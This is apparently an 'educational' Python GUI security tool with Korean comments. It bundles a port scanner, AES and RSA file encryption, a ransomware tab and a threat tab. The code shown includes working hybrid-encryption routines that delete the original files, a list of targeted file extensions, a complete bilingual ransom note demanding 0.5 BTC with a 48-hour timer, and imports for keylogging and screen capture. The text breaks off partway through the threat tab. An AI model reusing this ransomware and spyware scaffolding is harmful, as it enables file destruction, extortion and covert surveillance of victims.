import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import socket
import threading
import os
import sys
import pathlib
import time
import base64
import random
import shutil

# Pillow 라이브러리 
try:
    
    pass
except ImportError:
    
    pass

# mss 라이브러리 
try:
    import mss
    import mss.tools
except ImportError:
    messagebox.showerror("라이브러리 오류", "mss 라이브러리가 필요합니다. 'pip install mss'를 실행하세요.")
    sys.exit(1)


# pynput 라이브러리 (키 입력 모니터링 시뮬레이션용)
try:
    from pynput import keyboard
except ImportError:
    messagebox.showerror("라이브러리 오류", "pynput 라이브러리가 필요합니다. 'pip install pynput'을 실행하세요.")
    sys.exit(1)


# cryptography 라이브러리 
try:
    from cryptography.hazmat.primitives.asymmetric import rsa, padding as rsa_padding
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives.padding import PKCS7 
    from cryptography.hazmat.backends import default_backend
except ImportError:
    messagebox.showerror("라이브러리 오류", "cryptography 라이브러리가 필요합니다. 'pip install cryptography'를 실행하세요.")
    sys.exit(1)


# ==============================================================================
# I. 핵심 상수 정의 
# ==============================================================================

# 프로그램 시작 시 경로 설정이 안 되어 있을 경우의 기본 임시 경로
DEFAULT_BASE_DIR = pathlib.Path.home() / "security_tool_keys"
# 파일 처리 버퍼 크기 (1MB) - 대용량 파일 속도 개선을 위해 사용
CHUNK_SIZE = 1024 * 1024 

# 확장자 상수 정의
AES_EXT = ".aes_enc" # AES 암호화 파일 확장자
AES_KEY_EXT = ".aes_key" # AES 키 파일 확장자
HYB_EXT = ".hyb_enc" # RSA 하이브리드 암호화 파일 확장자 (랜섬웨어 탭과 RSA 탭에서 사용)
RANSOM_EXTS = ['.png', '.jpg', '.txt', '.hwp', '.mp4', '.mp3'] # 랜섬웨어 대상 확장자

# 위협 요소 체험 상수 정의
WORM_FILE_NAME = "virus_clone.log" # 웜 복제 대상 파일 이름
SPY_LOG_NAME = "spy_key_log.txt"  # 스파이웨어/키로거 로그 파일 이름
CAPTURE_NAME = "desktop_capture_" # 스파이웨어 캡처 파일 이름 접두사

# 랜섬노트 파일명 및 내용
RANSOM_NOTE_NAME = "READ_ME_DECRYPT.txt"
RANSOM_NOTE_CONTENT = """
=====================================================
당신의 파일은 암호화되었습니다!
=====================================================

당신의 모든 중요한 파일(사진, 문서, 영상 등)이 강력한 암호화 알고리즘으로 잠겨 있습니다.
파일을 복구할 수 있는 유일한 방법은 개인 복호화 키를 구매하는 것입니다.

[복호화 방법]
1. 비트코인 0.5 BTC를 다음 주소로 송금하세요: (가상의 주소)
2. 송금 후 48시간 내에 저희에게 연락하여 복호화 키를 받으세요.
3. 이 경고 파일을 삭제하지 마십시오.

키가 없으면 파일은 영원히 잠기게 됩니다!
당신이 이 메시지를 읽는 동안 시간은 흐르고 있습니다.

=====================================================
Your files have been encrypted!
=====================================================

All your important files (photos, documents, videos, etc.) have been locked with a
strong encryption algorithm.
The only way to recover your files is to purchase the private decryption key.

[How to Decrypt]
1. Send 0.5 BTC (Bitcoin) to the following address: (virtual address)
2. After the transfer, contact us within 48 hours to receive your decryption key.
3. Do not delete this warning file.

Without the key, your files will be locked forever!
Time is ticking while you read this message.

=====================================================
""" 

# 랜섬웨어 타이머 시간: 실제 48시간 
SIMULATION_DEADLINE_SECONDS = 172800 

# ==============================================================================
# II. 공통 암호화/복호화 도우미 함수 
# ==============================================================================

def generate_key_and_iv():
    """AES 키 (32바이트)와 IV (16바이트)를 생성합니다."""
    key = os.urandom(32) # AES-256 키
    iv = os.urandom(16) # CBC 모드 초기화 벡터
    return key, iv

def load_private_key(key_dir):
    """지정된 경로에서 개인키 파일을 로드합니다."""
    key_path = pathlib.Path(key_dir) / "private.pem"
    if not key_path.exists():
        raise FileNotFoundError(f"개인키 파일(private.pem)을 경로 '{key_dir}'에서 찾을 수 없습니다.")
    with open(key_path, "rb") as key_file:
        private_key = serialization.load_pem_private_key(
            key_file.read(),
            password=None, # 암호가 없는 키를 가정
            backend=default_backend()
        )
    return private_key

def load_public_key(key_dir):
    """지정된 경로에서 공개키 파일을 로드합니다."""
    key_path = pathlib.Path(key_dir) / "public.pem"
    if not key_path.exists():
        raise FileNotFoundError(f"공개키 파일(public.pem)을 경로 '{key_dir}'에서 찾을 수 없습니다.")
    with open(key_path, "rb") as key_file:
        public_key = serialization.load_pem_public_key(
            key_file.read(),
            backend=default_backend()
        )
    return public_key

# ==============================================================================
# III. AES 암호화/복호화 함수 
# ==============================================================================

def aes_encrypt_file_chunked(filepath, key_base_dir, progress_callback):
    """
    파일을 AES 대칭키로 암호화하고, 키와 IV를 별도의 파일로 저장합니다.
    """
    filesize = os.path.getsize(filepath)
    if filesize == 0:
        raise ValueError("파일 크기가 0바이트입니다.")

    key, iv = generate_key_and_iv() 

    encrypted_filepath = filepath + AES_EXT
    key_filename = f"{pathlib.Path(filepath).name}{AES_KEY_EXT}"
    key_filepath = pathlib.Path(key_base_dir) / key_filename

    # 1. 키 및 IV를 별도 파일로 저장
    try:
        with open(key_filepath, 'wb') as keyfile:
            keyfile.write(len(key).to_bytes(4, 'big')) 
            keyfile.write(key)
            keyfile.write(len(iv).to_bytes(4, 'big'))
            keyfile.write(iv)
    except Exception as e:
        raise IOError(f"키 파일 저장 실패: {e}")

    # 2. 파일 암호화
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    padder = PKCS7(algorithms.AES.block_size).padder() 
    
    bytes_processed = 0
    
    with open(filepath, 'rb') as infile, open(encrypted_filepath, 'wb') as outfile:
        while True:
            chunk = infile.read(CHUNK_SIZE)
            if not chunk:
                break
                
            if len(chunk) < CHUNK_SIZE:
                padded_data = padder.update(chunk) + padder.finalize()
                encrypted_chunk = encryptor.update(padded_data) + encryptor.finalize()
                outfile.write(encrypted_chunk)
            else:
                encrypted_chunk = encryptor.update(chunk)
                outfile.write(encrypted_chunk)

            bytes_processed += len(chunk)
            progress = int((bytes_processed / filesize) * 100)
            progress_callback(progress, f"AES 암호화 중 ({progress}%)")

    progress_callback(100, f"AES 암호화 완료. 키 파일: {key_filepath.name}")
    os.remove(filepath)
    return key_filepath

def aes_decrypt_file_chunked(encrypted_filepath, key_base_dir, progress_callback):
    """
    암호화된 파일을 복호화합니다.
    """
    original_filename = pathlib.Path(encrypted_filepath).name.replace(AES_EXT, '')
    key_filename = original_filename + AES_KEY_EXT
    key_filepath = pathlib.Path(key_base_dir) / key_filename
    
    if not key_filepath.exists():
        raise FileNotFoundError(f"키 파일 '{key_filename}'을 '{key_base_dir}'에서 찾을 수 없습니다.")

    # 1. 키 및 IV 로드
    try:
        with open(key_filepath, 'rb') as keyfile:
            key_len_bytes = keyfile.read(4)
            if len(key_len_bytes) < 4: raise ValueError("키 파일 손상: 키 길이 정보 누락")
            key_len = int.from_bytes(key_len_bytes, 'big')
            key = keyfile.read(key_len)
            
            iv_len_bytes = keyfile.read(4)
            if len(iv_len_bytes) < 4: raise ValueError("키 파일 손상: IV 길이 정보 누락")
            iv_len = int.from_bytes(iv_len_bytes, 'big')
            iv = keyfile.read(iv_len)
            
    except Exception as e:
        raise IOError(f"키 파일 로드 실패: {e}")

    decrypted_filepath = encrypted_filepath.replace(AES_EXT, "")
    filesize = os.path.getsize(encrypted_filepath)
    
    # 2. 파일 복호화
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    unpadder = PKCS7(algorithms.AES.block_size).unpadder()

    bytes_read = 0
    all_decrypted_data = b'' # 최종 언패딩을 위해 복호화 데이터를 모으는 버퍼

    with open(encrypted_filepath, 'rb') as infile:
        while True:
            chunk = infile.read(CHUNK_SIZE) 
            
            if not chunk:
                decrypted_padded_data = decryptor.finalize()
                all_decrypted_data += decrypted_padded_data
                break
                
            decrypted_chunk = decryptor.update(chunk)
            all_decrypted_data += decrypted_chunk
            
            bytes_read += len(chunk)
            progress = int((bytes_read / filesize) * 100)
            progress_callback(progress, f"AES 복호화 중 ({progress}%)")

    # 최종 언패딩 적용
    decrypted_data = unpadder.update(all_decrypted_data) + unpadder.finalize()
    
    with open(decrypted_filepath, 'wb') as outfile:
         outfile.write(decrypted_data)
        
    os.remove(encrypted_filepath) 
    progress_callback(100, "AES 복호화 완료 및 암호화 파일 삭제")


# ==============================================================================
# IV. 하이브리드 암호화 함수 
# ==============================================================================

def hybrid_encrypt_file_chunked(filepath, public_key, progress_callback):
    """
    파일을 AES 대칭키로 암호화하고, AES 키를 RSA 공개키로 암호화하여 저장합니다. 
    """
    
    filesize = os.path.getsize(filepath)
    if filesize == 0:
        raise ValueError("파일 크기가 0바이트입니다.")

    key, iv = generate_key_and_iv()
    
    # RSA로 AES 키 및 IV 암호화 (OAEP 패딩 사용)
    encrypted_key = public_key.encrypt(
        key,
        rsa_padding.OAEP( 
            mgf=rsa_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    encrypted_iv = public_key.encrypt(
        iv,
        rsa_padding.OAEP( 
            mgf=rsa_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    encrypted_filepath = filepath + HYB_EXT
    
    # Cipher 객체와 패딩 객체 생성
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    padder = PKCS7(algorithms.AES.block_size).padder()
    
    bytes_processed = 0
    
    with open(filepath, 'rb') as infile, open(encrypted_filepath, 'wb') as outfile:
        # A. 키 정보 길이 및 실제 키 정보 쓰기 (헤더)
        outfile.write(len(encrypted_key).to_bytes(4, 'big'))
        outfile.write(encrypted_key)
        outfile.write(len(encrypted_iv).to_bytes(4, 'big'))
        outfile.write(encrypted_iv)

        # B. 파일 내용을 블록 단위로 읽고 암호화
        while True:
            chunk = infile.read(CHUNK_SIZE)
            if not chunk:
                break
                
            if len(chunk) < CHUNK_SIZE:
                # 마지막 청크에 패딩 적용 후 암호화
                padded_data = padder.update(chunk) + padder.finalize()
                encrypted_chunk = encryptor.update(padded_data) + encryptor.finalize()
                outfile.write(encrypted_chunk)
            else:
                # 중간 청크는 바로 암호화
                encrypted_chunk = encryptor.update(chunk)
                outfile.write(encrypted_chunk)

            bytes_processed += len(chunk)
            progress = int((bytes_processed / filesize) * 100)
            progress_callback(progress, f"암호화 중 ({progress}%)")

    # 4. 원본 파일 삭제 (랜섬웨어 특성)
    os.remove(filepath)
    progress_callback(100, "암호화 완료 및 원본 삭제")


def hybrid_decrypt_file_chunked(encrypted_filepath, private_key, progress_callback):
    """
    복호화 로직 (청크 기반)
    """
    
    filesize = os.path.getsize(encrypted_filepath)
    if filesize == 0:
        raise ValueError("암호화된 파일 크기가 0바이트입니다.")
        
    decrypted_filepath = encrypted_filepath.replace(HYB_EXT, "")
    
    try:
        with open(encrypted_filepath, 'rb') as infile:
            
            # A. 암호화된 AES 키/IV 길이 및 실제 키 읽기 (헤더)
            enc_key_len_bytes = infile.read(4)
            if len(enc_key_len_bytes) < 4: raise ValueError("파일 헤더 손상: 암호화 키 길이 정보 누락")
            enc_key_len = int.from_bytes(enc_key_len_bytes, 'big')
            encrypted_key = infile.read(enc_key_len)
            
            enc_iv_len_bytes = infile.read(4)
            if len(enc_iv_len_bytes) < 4: raise ValueError("파일 헤더 손상: 암호화 IV 길이 정보 누락")
            enc_iv_len = int.from_bytes(enc_iv_len_bytes, 'big')
            encrypted_iv = infile.read(enc_iv_len)
            
            # B. RSA로 AES 키 및 IV 복호화 (OAEP 패딩 사용)
            key = private_key.decrypt(
                encrypted_key,
                rsa_padding.OAEP( 
                    mgf=rsa_padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            iv = private_key.decrypt(
                encrypted_iv,
                rsa_padding.OAEP( 
                    mgf=rsa_padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            
            # Cipher 객체와 언패딩 객체 생성
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
            decryptor = cipher.decryptor()
            unpadder = PKCS7(algorithms.AES.block_size).unpadder()

            # C. 파일 내용 복호화 (언패딩을 위해 모든 데이터를 모음)
            all_decrypted_data = b''
            header_size = infile.tell()
            
            while True:
                chunk = infile.read(CHUNK_SIZE) 
                
                if not chunk:
                    decrypted_padded_data = decryptor.finalize()
                    all_decrypted_data += decrypted_padded_data
                    break
                    
                decrypted_chunk = decryptor.update(chunk)
                all_decrypted_data += decrypted_chunk
                
                bytes_read = infile.tell() - header_size
                encrypted_content_size = filesize - header_size
                progress = int((bytes_read / encrypted_content_size) * 100)
                progress_callback(progress, f"복호화 중 ({progress}%)")

        # D. 복호화된 전체 데이터에 대해 최종적으로 언패딩을 적용합니다.
        decrypted_data = unpadder.update(all_decrypted_data) + unpadder.finalize()
        
        with open(decrypted_filepath, 'wb') as outfile:
             outfile.write(decrypted_data)
        
        # E. 암호화 파일 삭제
        os.remove(encrypted_filepath)
        progress_callback(100, "복호화 완료 및 암호화 파일 삭제")

    except Exception as e:
        progress_callback(0, f"⚠️ 복호화 오류 발생: {e}")
        raise e


# ==============================================================================
# V. GUI 클래스 및 실행 코드 
# ==============================================================================

class SecurityToolGUI:
    
    # 키 로깅 상태를 제어하기 위한 변수
    is_key_logging = False 
    # 키보드 리스너 객체 (정지/시작 제어용)
    key_listener = None 
    # 키로거 실시간 피드백 버퍼
    key_buffer = [] 
    
    def __init__(self, master):
        self.master = master
        master.title("🛡️ 파이썬 통합 보안 도구 (교육용)")
        
        # --- 핵심 경로 변수 초기화 ---
        self.key_base_dir = DEFAULT_BASE_DIR # RSA 키 저장 기본 경로
        self.aes_key_base_dir = DEFAULT_BASE_DIR / "AES_Keys" # AES 키 저장 기본 경로
        
        # --- 랜섬웨어 타이머 변수 초기화 ---
        self.ransom_timer_running = False
        self.ransom_time_left = SIMULATION_DEADLINE_SECONDS 
        self.ransom_timer_id = None # root.after() ID 저장용
        self.ransom_deadline_var = tk.StringVar(value="타이머: ---")
        
        # 키로거 버퍼 초기화
        self.key_buffer = []
        
        # 스타일 설정
        style = ttk.Style()
        style.configure('Encrypt.TButton', background='#1976D2', foreground='black', font=('Malgun Gothic', 10, 'bold'))
        style.configure('Decrypt.TButton', background='#D32F2F', foreground='black', font=('Malgun Gothic', 10, 'bold'))
        style.configure('Scan.TButton', background='#388E3C', foreground='black', font=('Malgun Gothic', 10, 'bold'))

        # 탭 노트북 생성
        self.notebook = ttk.Notebook(master)
        
        # 탭 추가
        self.create_port_scanner_tab()
        self.create_aes_tab() 
        self.create_rsa_tab()
        self.create_ransomware_tab()
        self.create_threat_tab() 
        self.create_developer_tab() 
        
        self.notebook.pack(expand=1, fill="both", padx=15, pady=15)
        
        # 초기 기본 경로 설정 (폴더가 없으면 생성 시도)
        self.set_key_directory(str(DEFAULT_BASE_DIR), is_init=True)
        # AES 키 폴더 초기 설정
        self.set_aes_key_directory(str(self.aes_key_base_dir), is_init=True)


    # ----------------------------------------------------------------------
    # A. 공통 유틸리티 및 경로 설정 
    # ----------------------------------------------------------------------
    
    def browse_file(self, entry_widget):
        """파일 선택 대화 상자를 열고 경로를 엔트리 위젯에 채움"""
        file_path = filedialog.askopenfilename()
        if file_path:
            entry_widget.delete(0, tk.END)
            entry_widget.insert(0, file_path)

    def browse_directory(self, entry_widget):
        """폴더 선택 대화 상자를 열고 경로를 엔트리 위젯에 채움"""
        dir_path = filedialog.askdirectory()
        if dir_path:
            entry_widget.delete(0, tk.END)
            entry_widget.insert(0, dir_path)
            
    def set_key_directory(self, path_str, is_init=False):
        """
        사용자가 지정한 경로를 RSA 키 파일의 기본 저장 경로로 설정하고 폴더를 생성합니다.
        """
        if not path_str:
            if not is_init: messagebox.showerror("오류", "유효한 경로를 입력해야 합니다.");
            return False
            
        try:
            new_path = pathlib.Path(path_str).resolve()
            new_path.mkdir(parents=True, exist_ok=True)
                
            self.key_base_dir = new_path
            
            # --- UI 업데이트 ---
            if hasattr(self, 'rsa_key_dir_path'): 
                self.rsa_key_dir_path.delete(0, tk.END)
                self.rsa_key_dir_path.insert(0, str(self.key_base_dir))
            
            if hasattr(self, 'ransom_key_info_label'):
                self.ransom_key_info_label.config(text=f"RSA 키 쌍은 '{self.key_base_dir}' 경로에 있어야 합니다.")

            if not is_init:
                messagebox.showinfo("경로 설정 완료", f"RSA 키 파일 저장 경로가 다음으로 설정되었습니다:\n{self.key_base_dir}")
            return True
        except Exception as e:
            if not is_init: messagebox.showerror("경로 설정 오류", f"유효하지 않은 경로입니다. 폴더 생성 실패: {e}");
            return False

    def set_aes_key_directory(self, path_str, is_init=False):
        """
        사용자가 지정한 경로를 AES 키 파일의 저장 경로로 설정하고 폴더를 생성합니다.
        """
        if not path_str:
            if not is_init: messagebox.showerror("오류", "유효한 경로를 입력해야 합니다.");
            return False
            
        try:
            new_path = pathlib.Path(path_str).resolve()
            new_path.mkdir(parents=True, exist_ok=True)
                
            self.aes_key_base_dir = new_path
            
            # --- UI 업데이트 ---
            if hasattr(self, 'aes_key_dir_path'): 
                self.aes_key_dir_path.delete(0, tk.END)
                self.aes_key_dir_path.insert(0, str(self.aes_key_base_dir))

            if hasattr(self, 'aes_key_info_label'):
                self.aes_key_info_label.config(text=f"🔑 AES 키/IV 저장 경로: '{self.aes_key_base_dir}'", foreground='#5D4037')
            
            if not is_init:
                messagebox.showinfo("AES 경로 설정 완료", f"AES 키 파일 저장 경로가 다음으로 설정되었습니다:\n{self.aes_key_base_dir}")
            return True
        except Exception as e:
            if not is_init: messagebox.showerror("AES 경로 설정 오류", f"유효하지 않은 경로입니다. 폴더 생성 실패: {e}");
            return False


    def update_progress(self, progress_var, status_var, percentage, message):
        """GUI의 진행률 및 상태 메시지를 업데이트합니다."""
        self.master.after(0, progress_var.set, percentage)
        self.master.after(0, status_var.set, message)


    # ----------------------------------------------------------------------
    # B. 탭 구성 메서드 
    # ----------------------------------------------------------------------
    
    # --- 1. 포트 스캐너 탭 ---
    def create_port_scanner_tab(self):
        port_frame = ttk.Frame(self.notebook, padding="15")
        self.notebook.add(port_frame, text="📡 포트 스캐너")
        
        port_frame.columnconfigure(1, weight=1) 
        
        ttk.Label(port_frame, text="대상 IP 주소:").grid(row=0, column=0, pady=5, padx=(0, 10), sticky='w')
        self.target_ip_entry = ttk.Entry(port_frame, width=35); self.target_ip_entry.grid(row=0, column=1, pady=5, sticky='ew', columnspan=2, padx=5)

        ttk.Label(port_frame, text="시작 포트:").grid(row=1, column=0, pady=5, sticky='w')
        self.start_port_entry = ttk.Entry(port_frame, width=10); self.start_port_entry.grid(row=1, column=1, pady=5, sticky='w', padx=5)

        ttk.Label(port_frame, text="끝 포트:").grid(row=2, column=0, pady=5, sticky='w')
        self.end_port_entry = ttk.Entry(port_frame, width=10); self.end_port_entry.grid(row=2, column=1, pady=5, sticky='w', padx=5)
        
        ttk.Button(port_frame, text="🔍 포트 스캔 시작", style='Scan.TButton', command=self.execute_scan_thread).grid(row=3, column=0, columnspan=3, pady=15, sticky='ew', padx=5)

        # 결과 표시 영역
        ttk.Label(port_frame, text="[스캔 결과]").grid(row=4, column=0, columnspan=3, pady=(5, 0), sticky='w')
        self.result_text = tk.Text(port_frame, height=10, width=50, state='disabled')
        self.result_text.grid(row=5, column=0, columnspan=3, pady=5, sticky='nsew', padx=5)
        
        port_frame.grid_rowconfigure(5, weight=1)
        
        # 진행률 표시
        self.scan_status_var = tk.StringVar(value="📢 스캔 준비 완료.") 
        ttk.Label(port_frame, textvariable=self.scan_status_var, font=('Malgun Gothic', 10, 'italic')).grid(row=6, column=0, columnspan=3, pady=(5, 2), sticky='w')
        self.scan_progress_var = tk.DoubleVar()
        ttk.Progressbar(port_frame, orient="horizontal", length=350, mode="determinate", variable=self.scan_progress_var).grid(row=7, column=0, columnspan=3, pady=5, sticky='ew', padx=5)


    # --- 2. AES 암호화/복호화 탭 ---
    def create_aes_tab(self):
        aes_frame = ttk.Frame(self.notebook, padding="15")
        self.notebook.add(aes_frame, text="🔒 AES 암호화")
        
        aes_frame.columnconfigure(1, weight=1) 
        
        # --- 키 저장 경로 설정 UI ---
        ttk.Label(aes_frame, text="키 저장 경로 설정:", font=('Malgun Gothic', 10, 'bold')).grid(row=0, column=0, columnspan=3, pady=(5, 5), sticky='w')
        
        self.aes_key_dir_path = ttk.Entry(aes_frame, width=35)
        self.aes_key_dir_path.grid(row=1, column=0, pady=7, padx=(0, 5), sticky='ew', columnspan=2)
        self.aes_key_dir_path.insert(0, str(self.aes_key_base_dir)) 
        
        ttk.Button(aes_frame, text="📁 폴더 선택", command=lambda: self.browse_directory(self.aes_key_dir_path)).grid(row=1, column=2, padx=5)
        ttk.Button(aes_frame, text="✅ 경로 설정/적용", command=lambda: self.set_aes_key_directory(self.aes_key_dir_path.get())).grid(row=2, column=0, columnspan=3, pady=(5, 10), sticky='ew', padx=5)

        ttk.Separator(aes_frame, orient='horizontal').grid(row=3, column=0, columnspan=3, sticky='ew', pady=10)

        # --- 파일 선택 UI ---
        ttk.Label(aes_frame, text="대상 파일 경로:").grid(row=4, column=0, pady=7, padx=(0, 10), sticky='w')
        self.aes_file_path = ttk.Entry(aes_frame, width=35); self.aes_file_path.grid(row=4, column=1, pady=7, padx=5, sticky='ew')
        ttk.Button(aes_frame, text="📁 파일 선택", command=lambda: self.browse_file(self.aes_file_path)).grid(row=4, column=2, padx=5)

        ttk.Button(aes_frame, text="🔐 파일 암호화 (AES)", style='Encrypt.TButton', command=self.execute_aes_encrypt_thread).grid(row=5, column=0, pady=(15, 5), columnspan=3, sticky='ew', padx=5)
        ttk.Button(aes_frame, text="🔓 파일 복호화 (AES)", style='Decrypt.TButton', command=self.execute_aes_decrypt_thread).grid(row=6, column=0, pady=5, columnspan=3, sticky='ew', padx=5)
        
        ttk.Separator(aes_frame, orient='horizontal').grid(row=7, column=0, columnspan=3, sticky='ew', pady=10)
        
        # --- 진행률 표시 위젯 ---
        self.aes_progress_var = tk.DoubleVar()
        self.aes_status_var = tk.StringVar(value="📢 파일 암호/복호화 준비 완료.") 
        
        ttk.Label(aes_frame, textvariable=self.aes_status_var, font=('Malgun Gothic', 10, 'italic')).grid(row=8, column=0, columnspan=3, pady=(5, 2), sticky='w')
        ttk.Progressbar(aes_frame, orient="horizontal", length=350, mode="determinate", variable=self.aes_progress_var).grid(row=9, column=0, columnspan=3, pady=5, sticky='ew', padx=5)
        
        # AES 키 정보 안내 
        self.aes_key_info_label = ttk.Label(aes_frame, text=f"🔑 AES 키/IV 저장 경로: '{self.aes_key_base_dir}'", foreground='#5D4037')
        self.aes_key_info_label.grid(row=10, column=0, columnspan=3, pady=5, sticky='w')


    # --- 3. RSA 키 관리 및 암호화 탭 ---
    def create_rsa_tab(self):
        rsa_frame = ttk.Frame(self.notebook, padding="15")
        self.notebook.add(rsa_frame, text="🔑 RSA 키/암호화")
        
        rsa_frame.columnconfigure(1, weight=1) 
        
        # --- 경로 설정 UI ---
        ttk.Label(rsa_frame, text="키 저장 기본 경로 설정:", font=('Malgun Gothic', 10, 'bold')).grid(row=0, column=0, columnspan=3, pady=(5, 5), sticky='w')
        
        self.rsa_key_dir_path = ttk.Entry(rsa_frame, width=35)
        self.rsa_key_dir_path.grid(row=1, column=0, pady=7, padx=(0, 5), sticky='ew', columnspan=2)
        self.rsa_key_dir_path.insert(0, str(self.key_base_dir)) 
        
        ttk.Button(rsa_frame, text="📁 폴더 선택", command=lambda: self.browse_directory(self.rsa_key_dir_path)).grid(row=1, column=2, padx=5)
        ttk.Button(rsa_frame, text="✅ 경로 설정/적용", command=lambda: self.set_key_directory(self.rsa_key_dir_path.get())).grid(row=2, column=0, columnspan=3, pady=(5, 10), sticky='ew', padx=5)

        ttk.Separator(rsa_frame, orient='horizontal').grid(row=3, column=0, columnspan=3, sticky='ew', pady=10)

        # RSA 키 생성 버튼
        ttk.Button(rsa_frame, text="✨ RSA 4096bit 키 쌍 생성", style='Encrypt.TButton', command=self.execute_rsa_key_pair_thread).grid(row=4, column=0, columnspan=3, pady=(5, 15), sticky='ew', padx=5)
        
        ttk.Separator(rsa_frame, orient='horizontal').grid(row=5, column=0, columnspan=3, sticky='ew', pady=10)

        # RSA 파일 암호화 섹션
        ttk.Label(rsa_frame, text="대상 파일 경로:").grid(row=6, column=0, pady=7, padx=(0, 10), sticky='w')
        self.rsa_file_path = ttk.Entry(rsa_frame, width=35); self.rsa_file_path.grid(row=6, column=1, pady=7, padx=5, sticky='ew')
        ttk.Button(rsa_frame, text="📁 파일 선택", command=lambda: self.browse_file(self.rsa_file_path)).grid(row=6, column=2, padx=5)

        ttk.Button(rsa_frame, text="🔐 파일 암호화 (RSA 공개키 사용)", style='Encrypt.TButton', command=self.execute_rsa_encrypt_thread).grid(row=7, column=0, pady=(15, 5), columnspan=3, sticky='ew', padx=5)
        ttk.Button(rsa_frame, text="🔓 파일 복호화 (RSA 개인키 사용)", style='Decrypt.TButton', command=self.execute_rsa_decrypt_thread).grid(row=8, column=0, pady=5, columnspan=3, sticky='ew', padx=5)

        # --- 진행률 표시 위젯 ---
        ttk.Separator(rsa_frame, orient='horizontal').grid(row=9, column=0, columnspan=3, sticky='ew', pady=10)
        self.rsa_progress_var = tk.DoubleVar()
        self.rsa_status_var = tk.StringVar(value="📢 키 관리 및 암호/복호화 준비 완료.") 
        
        ttk.Label(rsa_frame, textvariable=self.rsa_status_var, font=('Malgun Gothic', 10, 'italic')).grid(row=10, column=0, columnspan=3, pady=(5, 2), sticky='w')
        ttk.Progressbar(rsa_frame, orient="horizontal", length=350, mode="determinate", variable=self.rsa_progress_var).grid(row=11, column=0, columnspan=3, pady=5, sticky='ew', padx=5)


    # --- 4. 랜섬웨어 체험 탭 ---
    def create_ransomware_tab(self):
        ransom_frame = ttk.Frame(self.notebook, padding="15")
        self.notebook.add(ransom_frame, text="😈 랜섬웨어 체험")
        
        ransom_frame.columnconfigure(1, weight=1) 
        
        ttk.Label(ransom_frame, text="대상 폴더 경로:").grid(row=0, column=0, pady=7, padx=(0, 10), sticky='w')
        self.ransom_dir_path = ttk.Entry(ransom_frame, width=35); self.ransom_dir_path.grid(row=0, column=1, pady=7, padx=5, sticky='ew')
        ttk.Button(ransom_frame, text="📁 폴더 선택", command=lambda: self.browse_directory(self.ransom_dir_path)).grid(row=0, column=2, padx=5)

        ttk.Label(ransom_frame, text="암호화 대상 확장자:").grid(row=1, column=0, pady=7, sticky='w')
        ext_label = ttk.Label(ransom_frame, text=", ".join(RANSOM_EXTS).upper(), foreground='#D32F2F', font=('Malgun Gothic', 10, 'bold'))
        ext_label.grid(row=1, column=1, columnspan=2, pady=7, sticky='w')
        
        ttk.Separator(ransom_frame, orient='horizontal').grid(row=2, column=0, columnspan=3, sticky='ew', pady=10)

        # 핵심 기능 버튼
        ttk.Button(ransom_frame, text="🔥 폴더 내 파일 암호화 (RSA 하이브리드)", style='Encrypt.TButton', command=self.execute_ransom_encrypt_thread).grid(row=3, column=0, pady=(15, 5), columnspan=3, sticky='ew', padx=5)
        ttk.Button(ransom_frame, text="🔑 폴더 내 파일 복호화 (RSA 하이브리드)", style='Decrypt.TButton', command=self.execute_ransom_decrypt_thread).grid(row=4, column=0, pady=5, columnspan=3, sticky='ew', padx=5)
        
        ttk.Separator(ransom_frame, orient='horizontal').grid(row=5, column=0, columnspan=3, sticky='ew', pady=10)
        
        # --- 진행률 표시 위젯 ---
        self.ransom_progress_var = tk.DoubleVar()
        self.ransom_status_var = tk.StringVar(value="📢 랜섬웨어 체험 준비 완료.") 
        
        ttk.Label(ransom_frame, textvariable=self.ransom_status_var, font=('Malgun Gothic', 10, 'italic')).grid(row=6, column=0, columnspan=3, pady=(5, 2), sticky='w')
        self.ransom_progress_bar = ttk.Progressbar(ransom_frame, orient="horizontal", length=350, mode="determinate", variable=self.ransom_progress_var)
        self.ransom_progress_bar.grid(row=7, column=0, columnspan=3, pady=5, sticky='ew', padx=5)
        
        # --- 타이머 UI 추가 (48시간으로 문구 변경) ---
        self.ransom_deadline_label = ttk.Label(ransom_frame, 
                                               textvariable=self.ransom_deadline_var, 
                                               font=('Consolas', 16, 'bold'), 
                                               foreground='#5D4037', # 초기 색상
                                               anchor='center')
        self.ransom_deadline_label.grid(row=8, column=0, columnspan=3, pady=(15, 5), sticky='ew', padx=5)
        self.ransom_deadline_var.set("타이머: 48시간") 

        # RSA 키 관리 안내 
        self.ransom_key_info_label = ttk.Label(ransom_frame, text=f"RSA 키 쌍은 '{self.key_base_dir}' 경로에 있어야 합니다.", foreground='#5D4037')
        self.ransom_key_info_label.grid(row=9, column=0, columnspan=3, pady=5, sticky='w')


    # --- 5. 위협 요소 체험 탭 ---
    def create_threat_tab(self):
        threat_frame = ttk.Frame(self.notebook, padding="15")
        self.notebook.add(threat_frame, text="🦠 위협 요소 체험")
        
        threat_frame.columnconfigure(1, weight=1) 
        
        # --- 시뮬레이션 경로 설정 UI 추가 ---
        ttk.Label(threat_frame, text="시뮬레이션 로그/파일 저장 경로:", font=('Malgun Gothic', 10, 'bold')).grid(row=0, column=0, columnspan=3, pady=(5, 5), sticky='w')
        
        # 시뮬레이션 경로 입력창 (기본값은 키 저장 경로 내 ThreatSim)
        default_threat_dir = self.key_base_dir / "ThreatSim" 
        self.threat_log_dir_path = ttk.Entry(threat_frame, width=35)
        self.threat_log_dir_path.grid(row=1, column=0, pady=7, padx=(0, 5), sticky='ew', columnspan=2)
        self.threat_log_dir_path.insert(0, str(default_threat_dir))
        
